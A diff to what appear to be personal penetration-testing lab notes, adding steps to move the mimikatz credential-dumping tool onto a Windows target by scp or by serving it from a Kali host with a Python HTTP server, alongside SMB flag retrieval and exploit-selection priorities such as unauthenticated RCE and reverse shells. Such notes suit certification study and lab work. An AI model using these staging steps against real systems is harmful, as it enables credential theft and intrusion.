@@ -138,7 +138,17 @@
         smb: \> ls  
 	smb: \offsec\Downloads\> ls  
 	smb: \offsec\Downloads\> get flag.txt
-    - Kali find file: `find ~/ -iname "mimikatz.exe"`  
+    - Kali find file: `find ~/ -iname "mimikatz.exe"`
+    - transfer exploit to windows machine
+      `scp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe IEUser@192.168.56.104:/Users/IEUser/` OR
+      ```
+      download the package from https://github.com/gentilkiwi/mimikatz/releases
+      unzip to /home/kali/offsec/tools/minikatz
+      cd to /home/kali/offsec/tools/minikatz/x64
+      python3 -m http.server 80
+
+      target open the http://<KALI>
+      ```
   - Selecting [exploit](https://www.exploit-db.com/) rules
     - Priority
       - match service + version, unauthenticated exploit, RCE, exploit in python/bash, exploit with shellcode/reversell, exploit available in 'searchsploit'
